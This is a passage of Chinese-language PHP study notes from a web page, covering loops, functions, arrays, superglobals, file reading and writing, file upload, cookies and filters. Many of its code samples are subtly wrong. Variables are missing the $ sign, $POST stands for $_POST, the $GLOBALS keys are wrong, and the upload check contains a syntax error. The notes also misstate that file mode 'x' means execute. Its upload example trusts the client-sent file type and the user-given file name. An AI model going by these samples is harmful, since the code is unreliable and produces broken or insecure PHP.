&#x3D; label1时执行的代码;        break;    case label2:        expression &#x3D; label2时执行的代码;        break;    default:        表达式的值不等于label1和label2时执行的代码&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>如果没有case为真，才使用default</li></ol><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><ol><li>while只要条件为真，循环执行</li><li>do while先执行一次代码块，然后只要指定条件为真，则重复循环（<strong>先做一次do，再判断while</strong>），即至少会执行一次语句，即使条件测试在第一次就失败了</li></ol><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><ol><li>提前确定了脚本运行的次数，用for循环<pre class="line-numbers language-none"><code class="language-none">for(init counter;test counter;increment counter)&#123;    code to be executed;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>第一个参数是初始化循环计数器的值</li><li>第二个参数是判断每个循环迭代，true继续，false结束</li><li>第三个参数是增加循环计数器的值<pre class="line-numbers language-none"><code class="language-none">&lt;?php    for($x&#x3D;0;$x&lt;&#x3D;10;$x++)&#123;        echo &quot;xxx&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3></li><li>定义（1）</li><li>判断（2）</li><li>执行循环体语句</li><li>改变循环变量（3）</li></ol><h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><ol><li>foreach循环只用于数组，用于遍历数组中的每个键值对<pre class="line-numbers language-none"><code class="language-none">foreach($array as $value)&#123;    执行代码&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>每一次循环迭代，当前数组的值就会赋给$value变量，并且数组指针会逐一移动，直到到达最后一个数组元素<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $color &#x3D; array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);    foreach($color as $value)&#123; &#x2F;&#x2F;类似于c++中的范围遍历，将$color数组中的每一个元素作为value        echo &quot;value&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"><a href="#php真正的力量，来自于它的函数，php拥有超过1000个内建的函数" class="headerlink" title="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"></a>php真正的力量，来自于它的函数，php拥有超过1000个内建的函数</h3><h3 id="用户定义函数"><a href="#用户定义函数" class="headerlink" title="用户定义函数"></a>用户定义函数</h3><ol><li>以单词function开头<pre class="line-numbers language-none"><code class="language-none">function functionname()&#123;    被执行的代码;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>函数名对大小写不敏感</li></ol><h3 id="php函数参数"><a href="#php函数参数" class="headerlink" title="php函数参数"></a>php函数参数</h3><ol><li>通过参数向函数传递信息，参数类似于变量</li><li>逗号隔开参数<pre class="line-numbers language-none"><code class="language-none">&lt;?php    function family($name)&#123;        echo &quot;$name&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="默认参数值"><a href="#默认参数值" class="headerlink" title="默认参数值"></a>默认参数值</h3><ol><li>如果调用没有参数的函数，参数会取默认值</li><li>默认参数值只会发生在函数的<strong>调用过程</strong>中<pre class="line-numbers language-none"><code class="language-none">&lt;?php    function setheight($min&#x3D;60)&#123;        echo &quot;height is $min&quot;;    &#125;    setheight();     &#x2F;&#x2F;无参数，使用默认值60    setheight(100);  &#x2F;&#x2F;有参数，不适用默认值，使用传入的100?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="php函数返回值"><a href="#php函数返回值" class="headerlink" title="php函数返回值"></a>php函数返回值</h3><ol><li>使用返回值，用return</li><li>当函数内部使用形参时，想要往外输出参数，则需要return，因为形参不是全局变量、</li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组能够在单独的变量名中存储一个或多个值"><a href="#数组能够在单独的变量名中存储一个或多个值" class="headerlink" title="数组能够在单独的变量名中存储一个或多个值"></a>数组能够在单独的<strong>变量名</strong>中存储一个或多个值</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);    echo &quot;I like&quot; . $cars[0] . &quot;,&quot; . $cars[1] . &quot;,&quot; . cars[2] . &quot;.&quot;;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h3><ol><li>array()函数用于创建函数<h4 id="三种数组类型"><a href="#三种数组类型" class="headerlink" title="三种数组类型"></a>三种数组类型</h4></li><li>索引数组 - 带有数字索引的数组</li><li>关联数组 - 带有指定键的数组</li><li>多维数组 - 包含一个或多个数组的数组</li></ol><h4 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h4><h5 id="索引是自动分配的"><a href="#索引是自动分配的" class="headerlink" title="索引是自动分配的"></a>索引是自动分配的</h5><ol><li>索引自动分配，从0开始<pre class="line-numbers language-none"><code class="language-none">$cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);等价于$cars[0] &#x3D; &#39;a&#39;;$cars[1] &#x3D; &#39;b&#39;;$cars[2] &#x3D; &#39;c&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h4><ol><li>count()函数，即返回元素个数<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);    echo count($cars); &#x2F;&#x2F;运行结果即为3?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="遍历索引函数"><a href="#遍历索引函数" class="headerlink" title="遍历索引函数"></a>遍历索引函数</h4><ol><li>可以使用for循环遍历并输出索引数组的所有值<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    $arrlength&#x3D;count($cars);    for($x&#x3D;0;$x &lt; $arrlength;$x++)&#123;        echo $cars[x];        echo &quot;&lt;br&gt;&quot;;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h4><ol><li>关联数组是使用分配给数组的指定键的数组<pre class="line-numbers language-none"><code class="language-none">$age&#x3D;array(&quot;bill&quot; &#x3D;&gt; &quot;35&quot;,&quot;steve&quot; &#x3D;&gt; &quot;36&quot;,&quot;elon&quot; &#x3D;&gt; &quot;37&quot;);等价于$age[&quot;bill&quot;]&#x3D;&quot;35&quot;;$age[&quot;steve&quot;]&#x3D;&quot;36&quot;;$age[&quot;elon&quot;]&#x3D;&quot;37&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>语法：array(“键”=&gt;”值”,”键”=&gt;”值”);</li></ol><h5 id="遍历关联数组"><a href="#遍历关联数组" class="headerlink" title="遍历关联数组"></a>遍历关联数组</h5><ol><li>使用foreach循环，遍历并输出关联数组的所有值<pre class="line-numbers language-none"><code class="language-none">foreach($age as $x&#x3D;&gt;$x_value)&#123;    echo &quot;key&#x3D;&quot;.$x.&quot;,value&#x3D;&quot;.$x_value;    echo &quot;&lt;br&gt;&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h2><h3 id="sort"><a href="#sort" class="headerlink" title="sort()"></a>sort()</h3><ol><li>以升序对数组排序<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    sort($cars);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h3><ol><li>按照ascii码降序对数组进行排序,reverse的sort();<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);    rsort($cars);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h3><ol><li>根据值对数组进行升序排序</li><li>排序对象是关联数组，排序的根据是键值对的值<?php $age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47"); asort($age);?></li></ol><h3 id="ksort"><a href="#ksort" class="headerlink" title="ksort()"></a>ksort()</h3><ol><li>根据键对关联数组进行排序</li><li>排序对象是关联数组，排序的根据是键值对的键<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $age&#x3D;array(&quot;Bill&quot;&#x3D;&gt;&quot;63&quot;,&quot;Steve&quot;&#x3D;&gt;&quot;56&quot;,&quot;Elon&quot;&#x3D;&gt;&quot;47&quot;);    ksort($age);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="arsort"><a href="#arsort" class="headerlink" title="arsort()"></a>arsort()</h3><ol><li>根据值对关联数组进行降序排序</li></ol><h3 id="krsort"><a href="#krsort" class="headerlink" title="krsort()"></a>krsort()</h3><ol><li>根据键对关联数组进行降序排序</li></ol><h2 id="超全局变量"><a href="#超全局变量" class="headerlink" title="超全局变量"></a><strong>超全局变量</strong></h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ol><li>php中许多预定义变量都是超全局的，这意味着他们在一个脚本的全部作用域中都可用，无需执行global<pre class="line-numbers language-none"><code class="language-none">$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h3><ol><li>用于在PHP脚本中的任意位置访问全局变量</li><li>PHP在名为$GLOBALS[index]的数组中存储了所有全局变量，变量的名字就是数组的键(逐一这个地方是数组的名字，是去掉$的数组名字再加上单引号括起来)<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $x&#x3D;1;    $y&#x3D;2;    function addition() &#123;        $GLOBALS[&#39;$z&#39;] &#x3D; $GLOBALS[&#39;$x&#39;] + $GLOBALS[&#39;$y&#39;];    &#125;    addition();    echo $z;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="server"><a href="#server" class="headerlink" title="$_server"></a>$_server</h3><ol><li>$_server这种超全局变量保存关于报头，路径和脚本位置的信息<pre class="line-numbers language-none"><code class="language-none">&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SERVER_NAME&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_HOST&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_REFERER&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;HTTP_USER_AGENT&#39;];echo &quot;&lt;br&gt;&quot;;echo $_SERVER[&#39;SCRIPT_NAME&#39;];?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>$_server中访问的最重要的元素<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712002132.png"></li><li>重要的<pre class="line-numbers language-none"><code class="language-none">$_server[&#39;REQUEST_METHOD&#39;];返回访问页面使用的请求方法，例如post和get$_server[&#39;SERVER_ADDR&#39;];返回当前脚本所在的服务器的IP地址$_server[&#39;PHP_SELF&#39;];返回当前执行脚本的文件名$_server[&#39;SERVER_NAME&#39;];返回当前运行脚本所在的服务器的主机名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><ol><li>用于收集HTML表单提交的数据</li><li>下面是一个包含输入字段和提交按钮的表单，当用户通过点击提交按钮来提交表单数据时，表单将发送到<form>标签的 action 属性中指定的脚本文件.</li><li>在这个例子中，我们指定文件本身来处理表单数据。如果您需要使用其他的 PHP 文件来处理表单数据，请修改为您选择的文件名即可。然后，我们可以使用超级全局变量 $_REQUEST 来收集 input 字段的值：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;];?&gt;&quot;&gt;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;&lt;input type&#x3D;&quot;submit&quot;&gt;&lt;&#x2F;form&gt;&lt;?php $name &#x3D; $_REQUEST[&#39;fname&#39;]; echo $name; ?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="post"><a href="#post" class="headerlink" title="$_post"></a>$_post</h3><ol><li>广泛用于收集method=”post”的HTML表单后的表单数据<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]?&gt;&quot;&gt;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;fname&quot;&gt;;&lt;input type&#x3D;&quot;submit&quot;&gt;;&lt;&#x2F;form&gt;&lt;?php    $name &#x3D; $POST[&#39;fname&#39;];    echo $name;?&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="get"><a href="#get" class="headerlink" title="$_get"></a>$_get</h3><ol><li>用于提交HTML表单(method=”get”)之后的表单数据</li><li>$GET 也可以收集URL中发送的数据</li></ol><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ol><li>上面的$_POST和$_GET都是变量，类似于$GLOBAL,存储了脚本中的所有POST或者GET方法传入的参数</li><li>使用方法和$GLOBAL类似<pre class="line-numbers language-none"><code class="language-none">echo $_GET[&quot;name&quot;];echo $_POST[&quot;age&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><ol><li>$_GET是通过URL参数传递到当前脚本的变量数组</li><li>$_POST是通过HTTP POST传递到当前脚本的变量数组</li></ol><h3 id="何时使用"><a href="#何时使用" class="headerlink" title="何时使用"></a>何时使用</h3><ol><li>GET 方法从表单发送的信息对任何人都是可见的（所有变量名和值都显示在 URL 中）。GET 对所发送信息的数量也有限制。GET 可用于发送非敏感的数据。</li><li>GET可以看见<strong>注入点</strong>（发送的信息的变量名）</li><li>POST 方法从表单发送的信息对其他人是不可见的（所有名称/值会被嵌入 HTTP 请求的主体中）并且对所发送信息的数量也无限制。<h1 id="PHP文件处理"><a href="#PHP文件处理" class="headerlink" title="PHP文件处理"></a>PHP文件处理</h1><h2 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h2></li><li>readfile()函数读取文件，并把它写入输出缓冲</li><li>假设我们有一个名为 “webdictionary.txt” 的文本文件，存放在服务器上，就像这样：<pre class="line-numbers language-none"><code class="language-none">AJAX &#x3D; Asynchronous JavaScript and XMLCSS &#x3D; Cascading Style SheetsHTML &#x3D; Hyper Text Markup LanguagePHP &#x3D; PHP Hypertext PreprocessorSQL &#x3D; Structured Query LanguageSVG &#x3D; Scalable Vector GraphicsXML &#x3D; EXtensible Markup Language<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>读取此文件并且写到输出流的PHP代码如下：读取成功则readfile()函数<strong>返回字节数</strong><pre class="line-numbers language-none"><code class="language-none">&lt;?phpecho readfile(webdictionary.txt);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a>fopen()</h2><ol><li>提供比readfile()更多的选项</li><li>fopen的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式<pre class="line-numbers language-none"><code class="language-none">&lt;?php    $myfile&#x3D;fopen(&quot;webdictionary.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);    fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="文件打开的模式"><a href="#文件打开的模式" class="headerlink" title="文件打开的模式"></a>文件打开的模式</h2><ol><li>带+的读写都有<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220730140021.png"></li><li>r读</li><li>w重写</li><li>a追加写</li><li>x执行</li></ol><h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h2><ol><li>fread()读取打开的文件</li><li>fread()的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</li></ol><h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a>fclose()</h2><ol><li>fclose()函数用于关闭打开的文件</li><li>用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</li><li>fclose需要待关闭的文件的名称，或者存有文件名的变量</li></ol><h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h2><ol><li>fgets()函数用于从文件中读取单行</li><li>调用fgets()函数之后，文件指针会移动到下一行</li></ol><h2 id="feof"><a href="#feof" class="headerlink" title="feof()"></a>feof()</h2><ol><li>feof()函数检查是否已经到达end of file</li><li>feof()对于遍历未知长度的数据很有用<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable to open file&quot;);while(!feof($myfile))&#123;    echo fgets($myfile).&lt;br&gt;;&#125;fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fgetc"><a href="#fgetc" class="headerlink" title="fgetc()"></a>fgetc()</h2><ol><li>fgetc()函数用于从文件中读取单个字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php    fopen(&quot;a.txt&quot;,&quot;r&quot;) or die(&quot;unable&quot;);    while(!feof($myfile))&#123;        echo fgetc($myfile);    &#125;    fclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="fopen-1"><a href="#fopen-1" class="headerlink" title="fopen()"></a>fopen()</h2><ol><li>fopen()函数用于创建文件</li><li>在php中，创建文件所用的函数和打开文件的相同</li><li>如果fopen()没有遍历到文件，就会创建一个文件<pre class="line-numbers language-none"><code class="language-none">$myfile&#x3D;fopen(&quot;a.txt&quot;,&quot;w&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a>fwrite()</h2><ol><li>fwrite()函数用于写入文件</li><li>fwrite()的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php$myfile&#x3D;fopen(&quot;newfile.txt&quot;,&quot;w&quot;) or die(&quot;unable&quot;);$txt&#x3D;&quot;a&quot;;fwrite($myfile,$txt);&#x2F;&#x2F;写a$txt&#x3D;&quot;b&quot;;fwrite($myfile,$txt);&#x2F;&#x2F;写bfclose($myfile);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="PHP文件上传"><a href="#PHP文件上传" class="headerlink" title="PHP文件上传"></a>PHP文件上传</h1><h2 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h2><pre class="line-numbers language-none"><code class="language-none">&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&#39;multipart&#x2F;form-data&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>&lt;\form&gt;标签的enctype属性规定了在提交表单时要使用哪种内容类型，在表单需要使用二进制数据时，比如文件内容，请使用”multipart/form-data”</li><li>&lt;\input&gt;标签的type=”file”属性规定了应该把输入作为文件来处理，举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li></ol><h2 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h2><ol><li>upload_file.php文件含有供文件上传的代码</li><li>通过使用PHP的全局数组$_FILE，可以从客户端计算机向远程服务器上传文件</li></ol><h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><ol><li>第一个参数是input name</li><li>第二个下标可以是name type size tmp_name error<pre class="line-numbers language-none"><code class="language-none">$_FILES[&quot;file&quot;][&quot;name&quot;] 被上传文件的名称$_FILES[&quot;file&quot;][&quot;type&quot;] 被上传的文件类型$_FILES[&quot;file&quot;][&quot;size&quot;] 被上传的文件大小，以字节计算$_FILES[&quot;file&quot;][&quot;tmp_name&quot;] 存储在服务器的文件的临时副本名称$_FILES[&quot;file&quot;][&quot;error&quot;] 由文件上传导致的错误代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>总之$_FILES超全局变量的作用就是用来上传文件的</li></ol><h2 id="设置上传限制"><a href="#设置上传限制" class="headerlink" title="设置上传限制"></a>设置上传限制</h2><ol><li>只能上传gif或者jpeg文件<pre class="line-numbers language-none"><code class="language-none">if((($_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;gif&#39;) || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;jpeg&#39; || $_FILES[&#39;file&#39;][&#39;type&#39;] &#x3D;&#x3D; &#39;image&#x2F;pjpeg&#39;)) &amp;&amp; ($_FILES[&#39;file&#39;][&#39;size&#39;] &lt; 20000&gt;))&#123;    if($_FILES[&#39;file&#39;][&#39;error&#39;] &gt; 0) &#x2F;&#x2F; 这个地方如果为error则错误代码&gt;0    &#123;        echo &quot;ERROR&quot; . $_FILES[&#39;file&#39;][&#39;error&#39;] . &quot;&lt;br &#x2F;&gt;&quot;    &#125;    else&#123;        echo &quot;UPLOAD-name&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &lt;br &#x2F;&gt;        echo &quot;Type&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &lt;br &#x2F;&gt;        echo &quot;Size&quot; . $_FILES[&#39;file&#39;][&#39;size&#39;] . &quot;byte&quot; . &lt;br &#x2F;&gt;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h2><ol><li>上面的例子在服务器的PHP临时文件夹中创建了一个临时副本</li><li>这个临时副本会在脚本结束时消失，要保存被上传的文件，我们需要把它拷贝到另外的位置<pre class="line-numbers language-none"><code class="language-none">if(file_exists(&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123;    echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;already exists.&quot;;&#125;else&#123;    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);    echo &quot;stored in:&quot; . &quot;upload&#x2F;&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;];&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>上面的脚本检测了是否已经存在了此文件，如果不存在，则把文件拷贝到指定的文件夹</li><li>file_exists() 检测在指定目录下是否有文件名的文件存在</li><li>move_uploaded_file() 移动文件</li></ol><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="什么是cookie"><a href="#什么是cookie" class="headerlink" title="什么是cookie"></a>什么是cookie</h2><ol><li>cookie常用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie.通过php,您能够创建并取回cookie的值</li><li>注意一定是服务器留在用户计算机中的，服务器-&gt;用户计算机</li></ol><h2 id="创建cookie"><a href="#创建cookie" class="headerlink" title="创建cookie"></a>创建cookie</h2><ol><li>setcookie()函数用来设置cookie</li><li>setcookie()函数必须位于&lt;\html&gt;标签之前<pre class="line-numbers language-none"><code class="language-none">setcookie(name,value,expire,path,domain)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>创建用户名为user的cookie，将它赋值为alex port，规定在一小时后过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php     setcookie(&quot;user&quot;,&quot;alex port&quot;,time()+3600);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>在发送cookie时，cookie的值会自动进行URL编码，在取回时自动解码</li><li>为了防止URL编码，使用setrawcookie()函数取代，set 设置,raw 生的，没有改变进行URL编码的cookie</li></ol><h2 id="取回cookie的值"><a href="#取回cookie的值" class="headerlink" title="取回cookie的值"></a>取回cookie的值</h2><ol><li>$_COOKIE超全局变量用于取回cookie的值</li><li>取回名为user的cookie值，并且显示<pre class="line-numbers language-none"><code class="language-none">echo $_COOKIE[&#39;user&#39;];<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>使用isset()函数来确认是否已经设置了cookie<pre class="line-numbers language-none"><code class="language-none">&lt;?php    if(isset($_COOKIE[&quot;user&quot;]))        echo &quot;welcome&quot; . $_COOKIE[&#39;user&#39;] . &lt;br &#x2F;&gt;    else        echo &quot;welcome guest&quot; . &lt;br &#x2F;&gt;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h2><ol><li>当删除cookie时，应该使用过期日期变更为过去的时间点</li><li>如果过期日期在过去的时间点，则认为过去已经过期<pre class="line-numbers language-none"><code class="language-none">&lt;?php    setcookie(&quot;user&quot;,&quot;&quot;,time()-3600);&#x2F;&#x2F;默认为cookie的名称为user,值为空，时间在过去一个小时的时候已经过期?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h1 id="php错误处理"><a href="#php错误处理" class="headerlink" title="php错误处理"></a>php错误处理</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><ol><li>在php中，默认的错误处理很简单，一条消息会被发送到浏览器，这条消息带有文件名，行号，以及一条错误的信息</li></ol><h2 id="php错误处理-1"><a href="#php错误处理-1" class="headerlink" title="php错误处理"></a>php错误处理</h2><ol><li>在创建脚本和web应用程序时，错误处理是一个重要的部分。</li></ol><h2 id="基本的错误处理：使用die-函数"><a href="#基本的错误处理：使用die-函数" class="headerlink" title="基本的错误处理：使用die()函数"></a>基本的错误处理：使用die()函数</h2><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220802155519.png"></li><li>die()函数的错误处理机制，在错误之后终止了脚本</li></ol><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>PHP过滤器用于验证和过滤来自非安全来源的数据</li><li>验证和过滤用户输入或自定义是任何web应用程序的重要组成部分</li></ol><h2 id="为什么使用过滤器"><a href="#为什么使用过滤器" class="headerlink" title="为什么使用过滤器"></a>为什么使用过滤器</h2><ol><li>几乎所有的web应用程序都依赖外部的输入，这些数据通常都来自用户或其它应用程序</li><li>使用过滤器，能确保所有应用程序都获得正确的输入类型</li></ol><h2 id="什么是外部数据？"><a href="#什么是外部数据？" class="headerlink" title="什么是外部数据？"></a>什么是外部数据？</h2><pre class="line-numbers language-none"><code class="language-none">来自表单的输入数据Cookies服务器变量数据库查询结果<span aria-hidden="true" 